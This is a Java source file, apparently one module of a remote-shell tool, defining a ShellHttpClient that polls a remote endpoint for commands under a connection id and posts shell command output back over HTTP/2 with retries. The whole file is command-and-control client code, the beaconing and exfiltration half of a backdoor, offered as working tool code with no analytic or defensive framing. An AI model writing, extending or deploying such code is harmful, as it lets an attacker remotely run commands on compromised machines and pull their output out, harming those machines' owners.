package modules.net;

import modules.auxiliary.*;

import java.io.IOException;
import java.net.http.HttpClient;
import java.net.http.HttpClient.Version;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;

/**
    Http client for sending shell command execution results.

    @author Str1k3r
    @version 1.0
 */
public class ShellHttpClient {

    private Manager manager;
    private HttpClient client;
    private static ShellHttpClient instance;


    private ShellHttpClient() {
        manager = Manager.getInstance();
        client = manager.createHttpClient();
    }

    public static ShellHttpClient getInstance() {
        if(instance == null) {
            instance = new ShellHttpClient();
        }

        return instance;
    }

    public void sendCmdResult(String cmdResult) {
        CmdResult result = new CmdResult(manager.getConnectionId(), cmdResult);

        HttpRequest request = HttpRequest.newBuilder()
                .uri(Endpoint.cmdResult())
                .version(Version.HTTP_2)
                .headers("Content-type", "application/json")
                .POST(HttpRequest.BodyPublishers.ofString(manager.cmdResultToJSON(result)))
                .build();

        int counter = 0;
        while(counter < 5) { // attempt multiple times when fail
            try {
                System.out.printf("[*] Sending result of %d bytes:\n%s\n", result.resultString.length(), result.resultString);
                HttpResponse<String> httpResponse = client.send(request, HttpResponse.BodyHandlers.ofString());

                System.out.printf("Http Response %d:\n %s\n", httpResponse.statusCode(), httpResponse.body());
                if(httpResponse.statusCode() == 200) {
                    return;
                }

            } catch (Exception ex) {
                /* IO and Interrupted exceptions */
                ex.printStackTrace();
            }

            counter++;
        }

    }

    public Command requestCmd(String clientId) {
        RequestParameter parameter = new RequestParameter()
                .name("")
                .value(clientId);

        HttpRequest request = HttpRequest.newBuilder()
                .uri(Endpoint.cmdRequest())
                .version(Version.HTTP_2)
                .headers("Content-type", "application/json")
                .POST(HttpRequest.BodyPublishers.ofString(manager.requestParameterToJSON(parameter)))
                .build();

        int counter = 0;
        while(counter < 10) {

            try {
                HttpResponse<String> httpResponse = client.send(request, HttpResponse.BodyHandlers.ofString());

                return manager.jsonToCommand(httpResponse.body());
            }
            catch(Exception ex) {// Expecting IO and Interrupted exceptions

                try {
                    ex.printStackTrace();
                    Thread.sleep(Duration.ofSeconds(2));
                }
                catch (InterruptedException interruptEx) { /*forces  next iteration without wait*/ }
            }

            counter++;
        }

        return null;
    }
}
